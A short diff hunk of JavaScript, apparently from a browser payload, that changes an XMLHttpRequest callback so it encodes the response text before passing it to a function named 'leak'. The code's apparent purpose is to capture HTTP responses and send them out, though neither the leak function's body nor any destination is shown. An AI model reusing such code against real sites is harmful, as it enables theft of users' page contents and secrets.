@@ -7,7 +7,8 @@ leak = function(name, data)
 
 function reqListener () {
    try {
-      leak("response", this.responseText);
+      data = unescape(encodeURIComponent(this.responseText));
+      leak("response", data);
    }
    catch(e)
    {
